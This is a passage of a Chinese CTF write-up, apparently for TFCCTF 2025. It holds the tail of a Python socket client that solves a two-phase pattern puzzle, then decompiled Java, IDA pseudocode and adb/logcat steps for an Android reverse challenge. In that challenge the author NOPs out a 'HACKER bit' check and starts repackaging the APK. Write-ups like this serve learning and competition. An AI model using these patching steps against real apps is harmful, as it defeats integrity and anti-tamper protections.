&#123;&#125;</span><br><span class="line">    used_canons = <span class="built_in">set</span>()</span><br><span class="line">    ok_count = 0</span><br><span class="line">    cand_iter = candidate_patterns(max_k=5)</span><br><span class="line">    pending_mutated_line = None  <span class="comment"># 如果 we see MutatedPattern before loop break</span></span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        <span class="comment"># 主循环：持续处理服务器输出，直到看到 Phase2 标志再跳出</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] start main loop: will respond to every N_* until Phase2 appears&quot;</span>)</span><br><span class="line">        <span class="keyword">while</span> True:</span><br><span class="line">            try:</span><br><span class="line">                line = rdr.recv_line()</span><br><span class="line">            except TimeoutError:</span><br><span class="line">                <span class="comment"># 超时只是等待更多输出，继续循环</span></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[*] recv timeout waiting server... continue&quot;</span>)</span><br><span class="line">                <span class="built_in">continue</span></span><br><span class="line">            <span class="keyword">if</span> line is None:</span><br><span class="line">                raise EOFError(<span class="string">&quot;connection closed&quot;</span>)</span><br><span class="line">            line = line.strip()</span><br><span class="line">            <span class="keyword">if</span> line == <span class="string">&quot;&quot;</span>:</span><br><span class="line">                <span class="built_in">continue</span></span><br><span class="line">            <span class="built_in">print</span>(line)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 如果服务器明确进入 Phase2 或直接发送 MutatedPattern，跳出主循环进入 Phase2 处理</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;=== Phase 2 ===&quot;</span> <span class="keyword">in</span> line or <span class="string">&quot;MutatedPattern&quot;</span> <span class="keyword">in</span> line:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[*] detected Phase2 marker:&quot;</span>, line)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;MutatedPattern&quot;</span> <span class="keyword">in</span> line:</span><br><span class="line">                    pending_mutated_line = line</span><br><span class="line">                <span class="built_in">break</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># 处理 N_* 行</span></span><br><span class="line">            <span class="keyword">if</span> line.startswith(<span class="string">&quot;N_&quot;</span>) and <span class="string">&quot;:&quot;</span> <span class="keyword">in</span> line:</span><br><span class="line">                <span class="comment"># parse N</span></span><br><span class="line">                try:</span><br><span class="line">                    _, ns = line.split(<span class="string">&quot;:&quot;</span>, 1)</span><br><span class="line">                    N = int(ns.strip())</span><br><span class="line">                except:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;[!] can&#x27;t parse N line:&quot;</span>, line)</span><br><span class="line">                    <span class="built_in">continue</span></span><br><span class="line">                <span class="built_in">print</span>(f<span class="string">&quot;[Phase1] got N=&#123;N&#125; (OK &#123;ok_count&#125;/&#123;TARGET_OKS&#125;)&quot;</span>)</span><br><span class="line"></span><br><span class="line">                <span class="comment"># pick next candidate whose canonical is unused</span></span><br><span class="line">                segs = None; canon = None</span><br><span class="line">                <span class="keyword">for</span> cand <span class="keyword">in</span> cand_iter:</span><br><span class="line">                    c = canon_bits(cand)</span><br><span class="line">                    <span class="keyword">if</span> c not <span class="keyword">in</span> used_canons:</span><br><span class="line">                        segs = cand; canon = c; <span class="built_in">break</span></span><br><span class="line">                <span class="comment"># 如果 exhausted, 扩展 max_k 更大（极少发生）</span></span><br><span class="line">                <span class="keyword">if</span> segs is None:</span><br><span class="line">                    cand_iter = candidate_patterns(max_k=6)</span><br><span class="line">                    <span class="keyword">for</span> cand <span class="keyword">in</span> cand_iter:</span><br><span class="line">                        c = canon_bits(cand)</span><br><span class="line">                        <span class="keyword">if</span> c not <span class="keyword">in</span> used_canons:</span><br><span class="line">                            segs = cand; canon = c; <span class="built_in">break</span></span><br><span class="line">                <span class="keyword">if</span> segs is None:</span><br><span class="line">                    raise RuntimeError(<span class="string">&quot;no candidate available — 增加 max_k&quot;</span>)</span><br><span class="line"></span><br><span class="line">                <span class="comment"># 记录 mapping 并持久化（防断线）</span></span><br><span class="line">                used_canons.add(canon)</span><br><span class="line">                canon2N[canon] = N</span><br><span class="line">                save_mapping(canon2N)</span><br><span class="line"></span><br><span class="line">                <span class="comment"># 发送 pattern (m + lines)</span></span><br><span class="line">                out = str(len(segs)) + <span class="string">&quot;\n&quot;</span></span><br><span class="line">                <span class="keyword">for</span> (a,b) <span class="keyword">in</span> segs:</span><br><span class="line">                    out += f<span class="string">&quot;&#123;a[0]&#125; &#123;a[1]&#125; &#123;b[0]&#125; &#123;b[1]&#125;\n&quot;</span></span><br><span class="line">                ss.sendall(out.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line">                <span class="comment"># 读取服务器回复直到看到 OK 或 Error</span></span><br><span class="line">                replied_ok = False</span><br><span class="line">                <span class="keyword">for</span> _ <span class="keyword">in</span> range(60):</span><br><span class="line">                    try:</span><br><span class="line">                        resp = rdr.recv_line(<span class="built_in">timeout</span>=10.0)</span><br><span class="line">                    except TimeoutError:</span><br><span class="line">                        <span class="built_in">continue</span></span><br><span class="line">                    <span class="keyword">if</span> resp is None:</span><br><span class="line">                        <span class="built_in">continue</span></span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;[server]&quot;</span>, resp)</span><br><span class="line">                    <span class="keyword">if</span> <span class="string">&quot;OK&quot;</span> <span class="keyword">in</span> resp:</span><br><span class="line">                        ok_count += 1</span><br><span class="line">                        replied_ok = True</span><br><span class="line">                        <span class="built_in">break</span></span><br><span class="line">                    <span class="keyword">if</span> <span class="string">&quot;Input error&quot;</span> <span class="keyword">in</span> resp or <span class="string">&quot;Error&quot;</span> <span class="keyword">in</span> resp:</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">&quot;[!] server rejected our pattern:&quot;</span>, resp)</span><br><span class="line">                        <span class="comment"># don&#x27;t increment ok_count; will take next candidate on next N</span></span><br><span class="line">                        <span class="built_in">break</span></span><br><span class="line">                <span class="keyword">if</span> not replied_ok:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;[!] didn&#x27;t observe OK for this N (maybe server printed other lines), continuing&quot;</span>)</span><br><span class="line">                <span class="built_in">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># 其他行：打印并继续（欢迎语或说明）</span></span><br><span class="line">            <span class="built_in">continue</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 现在进入 Phase2：使用已收集的 mapping 回答变异 pattern</span></span><br><span class="line">        <span class="built_in">print</span>(f<span class="string">&quot;[+] entering Phase2. collected &#123;len(canon2N)&#125; mappings, ok_count=&#123;ok_count&#125;&quot;</span>)</span><br><span class="line">        solved = 0</span><br><span class="line"></span><br><span class="line">        <span class="comment"># helper to respond for one mutated pattern; supports pending_mutated_line</span></span><br><span class="line">        def handle_mutated(start_line=None):</span><br><span class="line">            nonlocal solved</span><br><span class="line">            <span class="comment"># start_line may contain &quot;MutatedPattern&quot; or None</span></span><br><span class="line">            <span class="keyword">if</span> start_line is None:</span><br><span class="line">                <span class="comment"># read until we find either a digit line (m) or a MutatedPattern marker</span></span><br><span class="line">                line = rdr.recv_line()</span><br><span class="line">                <span class="keyword">if</span> line is None: <span class="built_in">return</span> False</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                line = start_line</span><br><span class="line">            <span class="comment"># advance to get m</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;MutatedPattern&quot;</span> <span class="keyword">in</span> line:</span><br><span class="line">                m_line = rdr.recv_line().strip()</span><br><span class="line">            <span class="keyword">elif</span> line.strip().isdigit():</span><br><span class="line">                m_line = line.strip()</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="comment"># read until find integer line for m</span></span><br><span class="line">                m_line = None</span><br><span class="line">                <span class="keyword">for</span> _ <span class="keyword">in</span> range(6):</span><br><span class="line">                    l2 = rdr.recv_line()</span><br><span class="line">                    <span class="keyword">if</span> l2 is None: <span class="built_in">break</span></span><br><span class="line">                    <span class="keyword">if</span> l2.strip().isdigit():</span><br><span class="line">                        m_line = l2.strip(); <span class="built_in">break</span></span><br><span class="line">                <span class="keyword">if</span> m_line is None:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;[!] cannot find m for mutated pattern&quot;</span>); <span class="built_in">return</span> False</span><br><span class="line">            try:</span><br><span class="line">                m = int(m_line)</span><br><span class="line">            except:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[!] invalid m:&quot;</span>, m_line); <span class="built_in">return</span> False</span><br><span class="line">            segs = []</span><br><span class="line">            <span class="keyword">for</span> _ <span class="keyword">in</span> range(m):</span><br><span class="line">                <span class="built_in">ln</span> = rdr.recv_line().strip()</span><br><span class="line">                parts = ln.split()</span><br><span class="line">                <span class="keyword">if</span> len(parts) &lt; 4:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;[!] malformed segment line:&quot;</span>, <span class="built_in">ln</span>); <span class="built_in">return</span> False</span><br><span class="line">                x1,y1,x2,y2 = map(int, parts[:4])</span><br><span class="line">                A,B = sorted([(x1,y1),(x2,y2)])</span><br><span class="line">                segs.append((A,B))</span><br><span class="line">            <span class="comment"># optionally consume prompt line</span></span><br><span class="line">            try:</span><br><span class="line">                pl = rdr.recv_line(<span class="built_in">timeout</span>=0.5)</span><br><span class="line">                <span class="keyword">if</span> pl is not None and pl.strip() != <span class="string">&quot;&quot;</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;[Phase2 prompt?]&quot;</span>, pl)</span><br><span class="line">                <span class="comment"># if it wasn&#x27;t prompt, it&#x27;s fine (we might have consumed next thing)</span></span><br><span class="line">            except TimeoutError:</span><br><span class="line">                pass</span><br><span class="line">            <span class="comment"># compute canonical and lookup</span></span><br><span class="line">            c = canon_bits(segs)</span><br><span class="line">            N = canon2N.get(c, None)</span><br><span class="line">            <span class="keyword">if</span> N is None:</span><br><span class="line">                <span class="comment"># unknown canonical (shouldn&#x27;t happen if Phase1 collected all expected)</span></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[!] unknown canonical in Phase2:&quot;</span>, hex(c))</span><br><span class="line">                <span class="comment"># fallback: try to choose nearest by Hamming distance</span></span><br><span class="line">                def bitcount(x): <span class="built_in">return</span> x.bit_count()</span><br><span class="line">                cand = sorted(canon2N.items(), key=lambda kv: bitcount(kv[0] ^ c))</span><br><span class="line">                <span class="keyword">if</span> cand:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;[!] trying nearest candidate N =&quot;</span>, cand[0][1], <span class="string">&quot;hd=&quot;</span>, bitcount(cand[0][0]^c))</span><br><span class="line">                    N = cand[0][1]</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    N = 0</span><br><span class="line">            <span class="comment"># send answer</span></span><br><span class="line">            ss.sendall((str(N) + &quot;\n&quot;).encode(&#x27;utf-<span class="number">8</span>&#x27;))</span><br><span class="line">            <span class="comment"># read server response</span></span><br><span class="line">            try:</span><br><span class="line">                resp = rdr.recv_line(<span class="built_in">timeout</span>=10.0)</span><br><span class="line">                <span class="keyword">if</span> resp is not None:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;[Phase2 server]&quot;</span>, resp)</span><br><span class="line">                    <span class="keyword">if</span> resp.startswith(<span class="string">&quot;OK&quot;</span>):</span><br><span class="line">                        solved += 1</span><br><span class="line">                    <span class="keyword">if</span> <span class="string">&quot;&#123;&quot;</span> <span class="keyword">in</span> resp or <span class="string">&quot;TFCCTF&quot;</span> <span class="keyword">in</span> resp or <span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> resp.lower():</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">&quot;[+] flag/finish line:&quot;</span>, resp)</span><br><span class="line">                        <span class="comment"># read remaining</span></span><br><span class="line">                        try:</span><br><span class="line">                            <span class="keyword">while</span> True:</span><br><span class="line">                                l = rdr.recv_line(<span class="built_in">timeout</span>=1.0)</span><br><span class="line">                                <span class="keyword">if</span> l is None: <span class="built_in">break</span></span><br><span class="line">                                <span class="built_in">print</span>(l)</span><br><span class="line">                        except Exception:</span><br><span class="line">                            pass</span><br><span class="line">                        <span class="built_in">return</span> True</span><br><span class="line">            except TimeoutError:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[!] timeout waiting server after sending answer&quot;</span>)</span><br><span class="line">            <span class="built_in">return</span> False</span><br><span class="line"></span><br><span class="line">        <span class="comment"># If pending_mutated_line was set, handle it first</span></span><br><span class="line">        <span class="keyword">if</span> pending_mutated_line:</span><br><span class="line">            finished = handle_mutated(pending_mutated_line)</span><br><span class="line">            <span class="keyword">if</span> finished:</span><br><span class="line">                <span class="built_in">return</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># main Phase2 loop: read mutated patterns until server closes or flag found</span></span><br><span class="line">        <span class="keyword">while</span> True:</span><br><span class="line">            try:</span><br><span class="line">                line = rdr.recv_line()</span><br><span class="line">            except TimeoutError:</span><br><span class="line">                <span class="built_in">continue</span></span><br><span class="line">            <span class="keyword">if</span> line is None:</span><br><span class="line">                <span class="built_in">break</span></span><br><span class="line">            <span class="keyword">if</span> line.strip() == <span class="string">&quot;&quot;</span>:</span><br><span class="line">                <span class="built_in">continue</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[Phase2 recv]&quot;</span>, line)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;MutatedPattern&quot;</span> <span class="keyword">in</span> line or line.strip().isdigit():</span><br><span class="line">                finished = handle_mutated(line)</span><br><span class="line">                <span class="keyword">if</span> finished:</span><br><span class="line">                    <span class="built_in">break</span></span><br><span class="line">            <span class="comment"># else: print and continue</span></span><br><span class="line">            <span class="built_in">continue</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] Phase2 finished. solved OKs:&quot;</span>, solved)</span><br><span class="line">    except KeyboardInterrupt:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Interrupted by user&quot;</span>)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Fatal error:&quot;</span>, e)</span><br><span class="line">        traceback.print_exc()</span><br><span class="line">    finally:</span><br><span class="line">        try:</span><br><span class="line">            ss.shutdown(socket.SHUT_RDWR)</span><br><span class="line">        except:</span><br><span class="line">            pass</span><br><span class="line">        try:</span><br><span class="line">            ss.close()</span><br><span class="line">        except:</span><br><span class="line">            pass</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1><span id="reverse">Reverse</span><a href="#reverse" class="header-anchor"></a></h1><h2><span id="oxidized-intentions">OXIDIZED INTENTIONS</span><a href="#oxidized-intentions" class="header-anchor"></a></h2><p>借着这道题学习了很多apk解包、打包、签名的知识</p>
<p>arm的so所以必须要真机</p>
<p>首先分析java层可知做了个广播接收seed值（intent.getStringExtra(“seed”)）</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.oxidized_intentions;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.content.BroadcastReceiver;</span><br><span class="line"><span class="keyword">import</span> android.content.Context;</span><br><span class="line"><span class="keyword">import</span> android.content.Intent;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"><span class="keyword">import</span> android.widget.Toast;</span><br><span class="line"><span class="keyword">import</span> kotlin.Metadata;</span><br><span class="line"><span class="keyword">import</span> kotlin.jvm.internal.Intrinsics;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* compiled from: TicketReceiver.kt */</span></span><br><span class="line"><span class="meta">@Metadata(d1 = &#123;&quot;\u0000 \n\u0002\u0018\u0002\n\u0002\u0018\u0002\n\u0002\b\u0003\n\u0002\u0010\u0002\n\u0000\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0002\b\u0002\b\u0007\u0018\u0000 \n2\u00020\u0001:\u0001\nB\u0007¢\u0006\u0004\b\u0002\u0010\u0003J\u0018\u0010\u0004\u001a\u00020\u00052\u0006\u0010\u0006\u001a\u00020\u00072\u0006\u0010\b\u001a\u00020\tH\u0016¨\u0006\u000b&quot;&#125;, d2 = &#123;&quot;Lcom/example/oxidized_intentions/TicketReceiver;&quot;, &quot;Landroid/content/BroadcastReceiver;&quot;, &quot;&lt;init&gt;&quot;, &quot;()V&quot;, &quot;onReceive&quot;, &quot;&quot;, &quot;context&quot;, &quot;Landroid/content/Context;&quot;, &quot;intent&quot;, &quot;Landroid/content/Intent;&quot;, &quot;Companion&quot;, &quot;app_release&quot;&#125;, k = 1, mv = &#123;2, 0, 0&#125;, xi = 48)</span></span><br><span class="line"><span class="comment">/* loaded from: classes2.dex */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">TicketReceiver</span> <span class="keyword">extends</span> <span class="title class_">BroadcastReceiver</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">$stable</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">ACTION_FLAGGED</span> <span class="operator">=</span> <span class="string">&quot;com.example.oxidized_intentions.FLAGGED&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">EXTRA_FLAG</span> <span class="operator">=</span> <span class="string">&quot;flag&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">PART_J</span> <span class="operator">=</span> <span class="string">&quot;oxidized-&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// android.content.BroadcastReceiver</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onReceive</span><span class="params">(Context context, Intent intent)</span> &#123;</span><br><span class="line">        Intrinsics.checkNotNullParameter(context, <span class="string">&quot;context&quot;</span>);</span><br><span class="line">        Intrinsics.checkNotNullParameter(intent, <span class="string">&quot;intent&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">stringExtra</span> <span class="operator">=</span> intent.getStringExtra(<span class="string">&quot;seed&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (stringExtra == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        Log.d(<span class="string">&quot;OXI&quot;</span>, <span class="string">&quot;Got broadcast, seed=&quot;</span> + stringExtra);</span><br><span class="line">        <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> stringExtra;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i2</span> <span class="operator">=</span> <span class="number">0</span>; i2 &lt; str.length(); i2++) &#123;</span><br><span class="line">            i ^= str.charAt(i2);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">String</span> <span class="variable">flag</span> <span class="operator">=</span> Native.getFlag(context, stringExtra, PART_J, i &amp; <span class="number">255</span>);</span><br><span class="line">        Toast.makeText(context, flag, <span class="number">1</span>).show();</span><br><span class="line">        Log.d(<span class="string">&quot;OXI&quot;</span>, <span class="string">&quot;FLAG=&quot;</span> + flag);</span><br><span class="line">        <span class="type">Intent</span> <span class="variable">intent2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>(ACTION_FLAGGED);</span><br><span class="line">        intent2.setPackage(context.getPackageName());</span><br><span class="line">        intent2.putExtra(EXTRA_FLAG, flag);</span><br><span class="line">        context.sendBroadcast(intent2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.example.oxidized_intentions;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.content.Context;</span><br><span class="line"><span class="keyword">import</span> kotlin.Metadata;</span><br><span class="line"><span class="keyword">import</span> kotlin.jvm.JvmStatic;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* compiled from: Native.kt */</span></span><br><span class="line"><span class="meta">@Metadata(d1 = &#123;&quot;\u0000&amp;\n\u0002\u0018\u0002\n\u0002\u0010\u0000\n\u0002\b\u0003\n\u0002\u0010\u0002\n\u0000\n\u0002\u0010\u000e\n\u0000\n\u0002\u0018\u0002\n\u0002\b\u0003\n\u0002\u0010\b\n\u0000\bÇ\u0002\u0018\u00002\u00020\u0001B\t\b\u0002¢\u0006\u0004\b\u0002\u0010\u0003J\b\u0010\u0004\u001a\u00020\u0005H\u0007J)</span>\u0010\u0006\u001a\u00020\u00072\u0006\u0010\b\u001a\u00020\t2\u0006\u0010\n\u001a\u00020\u00072\u0006\u0010\u000b\u001a\u00020\u00072\u0006\u0010\f\u001a\u00020\rH\u0087 ¨\u0006\u000e<span class="string">&quot;&#125;, d2 = &#123;&quot;</span>Lcom/example/oxidized_intentions/Native;<span class="string">&quot;, &quot;</span><span class="string">&quot;, &quot;</span>&lt;init&gt;<span class="string">&quot;, &quot;</span>()V<span class="string">&quot;, &quot;</span>initAtLaunch<span class="string">&quot;, &quot;</span><span class="string">&quot;, &quot;</span>getFlag<span class="string">&quot;, &quot;</span><span class="string">&quot;, &quot;</span>ctx<span class="string">&quot;, &quot;</span>Landroid/content/Context;<span class="string">&quot;, &quot;</span>seed<span class="string">&quot;, &quot;</span>part<span class="string">&quot;, &quot;</span>check<span class="string">&quot;, &quot;</span><span class="string">&quot;, &quot;</span>app_release<span class="string">&quot;&#125;, k = 1, mv = &#123;2, 0, 0&#125;, xi = 48)</span></span><br><span class="line"><span class="string">/* loaded from: classes2.dex */</span></span><br><span class="line"><span class="string">public final class Native &#123;</span></span><br><span class="line"><span class="string">    public static final int $stable = 0;</span></span><br><span class="line"><span class="string">    public static final Native INSTANCE = new Native();</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    @JvmStatic</span></span><br><span class="line"><span class="string">    public static final native String getFlag(Context ctx, String seed, String part, int check);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    @JvmStatic</span></span><br><span class="line"><span class="string">    public static final void initAtLaunch() &#123;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    private Native() &#123;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    static &#123;</span></span><br><span class="line"><span class="string">        System.loadLibrary(&quot;</span>oxi<span class="string">&quot;);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure>

<p>分析native层getFlag函数可知，里面实现了很复杂的seed生成随机数操作，比较字符串fe2o3rust</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v76 != <span class="number">9</span> || (v13 = s1, v14 = <span class="built_in">memcmp</span>(s1, aFe2o3rust, <span class="number">9uLL</span>), (_DWORD)v14) )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_QWORD *)&amp;v89 = &amp;v74;</span><br><span class="line">    *((_QWORD *)&amp;v89 + <span class="number">1</span>) = sub_115DC;</span><br><span class="line">    sub_475C4();</span><br><span class="line">    *(_QWORD *)&amp;v90 = v15;</span><br><span class="line">    *((_QWORD *)&amp;v90 + <span class="number">1</span>) = v16;</span><br><span class="line">    v99 = &amp;off_4FBE0;</span><br><span class="line">    v100 = <span class="number">3LL</span>;</span><br><span class="line">    v101 = &amp;v89;</span><br><span class="line">    v102 = <span class="number">2uLL</span>;</span><br><span class="line">    v17 = sub_473F8(v81);</span><br></pre></td></tr></table></figure>

<p>后面还有一个逐位异或验证哈希值，由此可知seed值应该为<code>fe2o3rust</code></p>
<p>尝试adb安装apk到真机，然后广播seed值</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell am broadcast -n com.example.oxidized_intentions/.TicketReceiver --es seed <span class="string">&quot;fe2o3rust&quot;</span></span><br></pre></td></tr></table></figure>

<p>查看log（adb logcat -s OXI）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">08</span><span class="number">-29</span> <span class="number">22</span>:<span class="number">37</span>:<span class="number">18.146</span> <span class="number">10323</span> <span class="number">10323</span> D OXI     : Computing flag <span class="keyword">for</span> seed=<span class="string">&#x27;fe2o3rust&#x27;</span> ...</span><br><span class="line"><span class="number">08</span><span class="number">-29</span> <span class="number">22</span>:<span class="number">37</span>:<span class="number">19.149</span> <span class="number">10323</span> <span class="number">10323</span> D OXI     : anti_hook_check elapsed=<span class="number">1003</span>ms</span><br><span class="line"><span class="number">08</span><span class="number">-29</span> <span class="number">22</span>:<span class="number">38</span>:<span class="number">24.097</span> <span class="number">10323</span> <span class="number">10323</span> D OXI     : HACKER bit not <span class="built_in">set</span> -&gt; returning FAKE</span><br><span class="line"><span class="number">08</span><span class="number">-29</span> <span class="number">22</span>:<span class="number">38</span>:<span class="number">24.114</span> <span class="number">10323</span> <span class="number">10323</span> D OXI     : FLAG=FAKE&#123;<span class="number">2152411021524119</span>&#125;</span><br></pre></td></tr></table></figure>

<p>发现<code>HACKER bit not set -&gt; returning FAKE</code>，由此可知需要patch掉下面的if，不让他进去</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( HACKER != <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v58 = sub_1187C(&amp;unk_480F, <span class="number">36LL</span>);        <span class="comment">// &quot;HACKER bit not set -&gt; returning FAKE&quot;</span></span><br><span class="line">    v94 = (__int64 *)&amp;v87;</span><br><span class="line">    v95 = sub_15B00;</span><br><span class="line">    *(_QWORD *)&amp;v87 = v76 ^ <span class="number">0x2152411021524110L</span>L;</span><br><span class="line">    v101 = <span class="number">0LL</span>;</span><br><span class="line">    v102 = <span class="number">0x10u</span>LL;</span><br><span class="line">    v99 = (<span class="type">char</span> **)(&amp;dword_0 + <span class="number">2</span>);</span><br><span class="line">    *(_QWORD *)&amp;v103 = <span class="number">0x800000020L</span>L;</span><br><span class="line">    sub_47354(v58);</span><br><span class="line">    sub_113E4(v83, &amp;v89);</span><br><span class="line">    v45 = sub_474D4(&amp;v89);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)v89 != <span class="number">15</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v68 = sub_472C8(v45);</span><br><span class="line">      v69 = sub_472E4(v68);</span><br><span class="line">      sub_472F8(v69);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_38;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>直接nop掉跳转即可</p>
<p><img src="../images/2025-TFCCTF/15.png" alt="1"></p>
<p>然后apply patches</p>
<p>接下来需要做的是把新的so重新打包回去，这里需要借助apktool</p>
